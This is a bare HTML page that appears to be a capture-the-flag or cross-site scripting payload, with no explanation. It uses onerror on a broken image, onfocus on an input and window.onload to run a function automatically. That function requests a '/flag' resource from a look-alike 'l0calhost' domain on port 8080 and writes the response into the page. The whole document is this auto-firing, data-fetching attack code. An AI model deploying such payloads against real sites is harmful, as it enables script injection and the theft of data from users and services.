<html>

<body>
    <img src="x" onerror="get_page_info()">
    <input onfocus="get_page_info()"  id="name" type="text">
    <div id="respose"></div><br>
    <div id="test"></div>
</body>

<script>
    window.onload = get_page_info();
    function get_page_info(){
        document.getElementById('test').innerHTML = "justfortest";
        var xhttp = new XMLHttpRequest();
        xhttp.open("get", "https://l0calhost.hmb-baraka.com:8080/flag",true); 
        xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            document.getElementById('respose').innerHTML = this.responseText;
        }
        };
        xhttp.send();
    }
</script>

</html>
